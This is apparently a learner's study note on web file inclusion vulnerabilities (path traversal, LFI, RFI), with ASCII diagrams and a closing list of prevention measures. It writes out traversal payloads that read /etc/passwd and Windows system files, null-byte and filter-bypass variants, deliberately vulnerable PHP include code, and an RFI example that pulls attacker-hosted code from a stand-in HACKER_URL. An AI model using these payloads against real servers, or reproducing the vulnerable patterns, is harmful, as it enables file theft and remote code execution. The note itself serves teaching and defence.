- In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via query parameters
- the main cause is that the input is not validated
- leak data (code, credentials or other files) related to the web application or operating system
- if the hacker can write files to the server file inclusion might be used in tandem to gain [Remote Code Execution](../Remote%20Code%20Execution.md)

```
http://URL/get.php?file=xyz.pdf
```

normal Flow without using File Inclusion:
```
                                                                                                                     ┌───────┐
                                                                                                                     │       │
                                                                                                                     │   /   │
                                                                                                                     │       │
                                                                                                                     └───┬───┘
                                                                                                                         │
                                                                                                           ┌─────────────┼─────────────┐
                                                                                                           │             │             │
                                                                                                       ┌───┴───┐     ┌───┴───┐     ┌───┴───┐
                                                                                                       │       │     │       │     │       │
                                                                                                       │  var  │     │  usr  │     │  etc  │
                                                                                                       │       │     │       │     │       │
                                                                                                       └───┬───┘     └───────┘     └───┬───┘
                                                                                                           │                           │
                                                                                                           │                           │
                                                                                                           │                           │
┌──────┐                                                ┌──────┐                                       ┌───┴───┐                   +++++++++
│      │ http://URL/get.php?file=xyz.pdf                │      │                                       │       │                   +       +
│Hacker├───────────────────────────────────────────────►│Server├────────────────────┐                  │  web  │                   +passwd +
│      │                                                │      │                    │                  │       │                   +       +
└──────┘                                                └──────┘                    │                  └───┬───┘                   +++++++++
    ▲                                                                               │                      │
    │                                      Web-APP is served at /var/www/app        │                      │
    │                                                                               │                      │
    │                                                                               │                  ┌───┴───┐
    │                                                                               │                  │       │
    │                                                                               │                  │  app  │
    │                                                                               │                  │       │
    │                                                                               │                  └───┬───┘
    │                                                                               │                      │
    │                                                                               │                ┌─────┴─────┐
    │                                                                               │                │           │
    │                                                                               │            +++++++++   ┌───┴───┐
    │                                                                               │            +       +   │       │
    │                                                                               └───────────►+get.php+   │ files │
    │                                                                                            +       +   │       │
    │                                                                                            +++++++++   └───┬───┘
    │                                                                                                │           │
    │                                                                                                │           │
    │                                                                                                │           │
    │                                                                                                │       +++++++++
    │                                                                                                │       +       +
    │                                                                                                └──────►+xyz.pdf+
    │                                                                                                        +       +
    │                                                                                                        +++++++++
    │                                                                                                            │
    └────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
```

# Directory / Path Traversal
- allows an attacker to read operating system resources, such as local files on the server running an application
- The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory
- Path traversal vulnerabilities occur when the user's input is passed to a function such as file_get_contents in PHP. It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the file_get_contents to read the content of a file

- you can try a set of common files: [Vulnerable OS Files](../Vulnerable%20OS%20Files.md)

```
http://URL/get.php?file=../../../../etc/passwd
```

```
                                                                                                  ┌──────────────────────────────────────────┐
                                                                                                  │                                          │
                                                                                                  │                  ┌───────┐               │
                                                                                                  │                  │       │               │
                                                                                                  │                  │   /   │               │
                                                                                                  │                  │       │               │
                                                                                                  │                  └───┬───┘               │
                                                                                                  │                      │                   │
                                                                                                  │ ..     ┌─────────────┼─────────────┐     │
                                                                                                  │        │             │             │     │
                                                                                                  │    ┌───┴───┐     ┌───┴───┐     ┌───┴───┐ │
                                                                                                  │    │       │     │       │     │       │ │
                                                                                                  │    │  var  │     │  usr  │     │  etc  │ │
                                                                                                  │    │       │     │       │     │       │ │
                                                                                                  │    └───┬───┘     └───────┘     └───┬───┘ │
                                                                                                  │        │                           │     │
                                                                                                  │ ..     │                           │     │
                                                                                                  │        │                           │     │
┌──────┐                                                ┌──────┐                                  │    ┌───┴───┐                   +++++++++ │
│      │ http://URL/get.php?file=../../../../etc/passwd │      │                                  │    │       │                   +       + │
│Hacker├───────────────────────────────────────────────►│Server├────────────────────┐             │    │  web  │                   +passwd +◄┘
│      │                                                │      │                    │             │    │       │                   +       +
└──────┘                                                └──────┘                    │             │    └───┬───┘                   +++++++++
    ▲                                                                               │             │        │                           │
    │                                      Web-APP is served at /var/www/app        │             │ ..     │                           │
    │                                                                               │             │        │                           │
    │                                                                               │             │    ┌───┴───┐                       │
    │                                                                               │             │    │       │                       │
    │                                                                               │             │    │  app  │                       │
    │                                                                               │             │    │       │                       │
    │                                                                               │             │    └───┬───┘                       │
    │                                                                               │             │ ..     │                           │
    │                                                                               │             │  ┌─────┴─────┐                     │
    │                                                                               │             │  │           │                     │
    │                                                                               │            +++++++++   ┌───┴───┐                 │
    │                                                                               │            +       +   │       │                 │
    │                                                                               └───────────►+get.php+   │ files │                 │
    │                                                                                            +       +   │       │                 │
    │                                                                                            +++++++++   └───┬───┘                 │
    │                                                                                                            │                     │
    │                                                                                                            │                     │
    │                                                                                                            │                     │
    │                                                                                                        +++++++++                 │
    │                                                                                                        +       +                 │
    │                                                                                                        +xyz.pdf+                 │
    │                                                                                                        +       +                 │
    │                                                                                                        +++++++++                 │
    └──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
```

similar on windows server:
```
http://URL/get.php?file=../../../../boot.ini
```

```
http://URL/get.php?file=../../../../windows/win.ini
```



# Local File Inclusion LFI
- LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as `include`, `require`, `include_once`, and `require_once` often contribute to vulnerable web 
- other languages such as ASP, JSP, Python, or even in Node.js apps
- LFI exploits follow the same concepts as [Directory / Path Traversal](File%20Inclusion.md#Directory%20/%20Path%20Traversal)

Examles:
1. suppose the web app provides multiple languages (EN, DE)
   ```php
<?PHP 
	include($_GET["lang"]);
?>
```
The PHP code above uses a GET request via the URL parameter lang to include the language of the page. possible HTTP request: `http://URL/index.php?lang=EN.php`, where `EN.php` and `DE.php` files exist in the same directory.

Theoretically, we can access and display any readable file on the server from the code above if there isn't any input validation e.g.: `http://URL/index.php?lang=/etc/passwd`

it works because there isn't a directory specified in the include function and no input validation

2. Next, In the following code, the developer decided to specify the directory inside the function.
```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

In the above code, the developer decided to use the include function to call PHP pages in the `languages` directory only via lang parameters.
`http://URL/index.php?lang=../../../../etc/passwd`, which is similar to [Directory / Path Traversal](File%20Inclusion.md#Directory%20/%20Path%20Traversal)


## Bypass appending file extension
- some developers append a file extension and frovide just the name of the file in the query parameter: `http://URL/index.php?lang=EN` -> `include(languages/EN.php)`
- the problem is, that this a LFI with `http://URL/index.php?lang=../../../../etc/passwd` will result in `include(languages/../../../../../etc/passwd.php)`
- we could see that in the following error:
```php
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/app/index.php on line 12
```
- here we could use a [Null Byte](../Null%20Byte.md) technique to skip whatever comes after the null byte
- so `http://URL/index.php?lang=../../../../etc/passwd%00` will result in: `include(languages/../../../../../etc/passwd)`

## Bypass filtered files
- some web app filter / block specific files for the function e.g. `/etc/passwd`
- to trick that filter we can use the current directory trick `/.`: `http://URL/index.php?lang=../../../../etc/passwd/.`

## Bypass replaced values
- some web app replace `../` with empty string to prevent the attacker from breaking out the current directory
- we can see that by the request `http://URL/index.php?lang=../../../../etc/passwd` and the corresponding error where the `../` are missing:
```php
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/app/index.php on line 15
```
  - we can bypass that with extra `../`: so `....//....//....//....//` will result in `../../../../` when the `../` got replace with an empty string: `http://URL/index.php?lang=....//....//....//....//etc/passwd`

## Bypass defined directories
- sometimes developer require the location in the paramater and require it to start with e.g. `languages`: `http://URL/index.php?lang=languages/EN.php`
- we can bypass that via: `http://URL/index.php?lang=languages/../../../../etc/passwd`



# Remote File Inclusion RFI
- Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application
- like LFI it occurs when user input is not validated properly, but **allowing an attacker to inject an external URL into include function**
- a requirement for an RFI is that the `allow_url_fopen` has to be  `on`
- The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain [Remote Code Execution](../Remote%20Code%20Execution.md) on the server. other risks are Senesetive Inormation Disclosure, [Cross-Site Scripting XSS](Cross-Site%20Scripting%20XSS.md) and [Denial of Service DoS](Denial%20of%20Service%20DoS.md)
- An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server:

Example:
1. the hacker sends a requst to server with his own malcious file from his own server as query parameter: `http://URL/index.php?file=http://HACKER_URL/rfi.txt` where the file `rfi.txt` contains executable code like:
```php
<?PHP echo "Hello THM"; ?>
```
2. the web app requests the hackers file: `GET http://HACKER_URL/rfi.txt` 
3. the hackers server responds the malicious file
4. web app injects the content of `rfi.txt` into the include function and executes it
5. web app sends the result of the execution within the `index.php` page to the hackers client (not server)
```
                                                                     4.

                                                                 injects and
                                                                 executes it
                              1.                                ┌───────┐
                                                                ▼       │
┌──────┐ http://URL/index.php?file=http://HACKER_URL/rfi.txt ┌──────┐   │
│Hacker├────────────────────────────────────────────────────►│ Web  │   │
│Client│                                                     │Server├───┘
│      │◄────────────────────────────────────────────────────┤      │
└──────┘    result of the execution within the index.php     └─┬────┘
                                                               │  ▲
                              5.                               │  │
                                                               │  │
                                                               │  │
                                                               │  │
                                                               │  │
                              2.                               │  │
                                                               │  │
┌──────┐          GET http://HACKER_URL/rfi.txt                │  │
│Hacker│◄──────────────────────────────────────────────────────┘  │
│Server│                                                          │
│      ├──────────────────────────────────────────────────────────┘
└──────┘          sends content of rfi.txt

                              3.
```

## Setup malicious file locally
### usage of python build in http server
1. create executable file `rfi.txt` in a secure folder (probably an empty folder, because everything in here is shared publicly)
2. get your public IP (`ifconfig` inet with public IP) - but must be allowed by router / firewall settings
3. run `python -m http.server` in that folder
4. access that file via `http://YOUR_IP:8000/rfi.txt`
5. provide that url as remote file



# How to prevent File Inclusions
1. keep system, services, web application frameworks and everthiy up to date
2. turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. use a Web Application Firewall (WAF)
4. disable PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as `allow_url_fopen` on and `allow_url_include`
5. allow only protocols and wrappers that are in need
6. never trust user input and validate it properly
7. implement whitelisting (and blacklisting) for files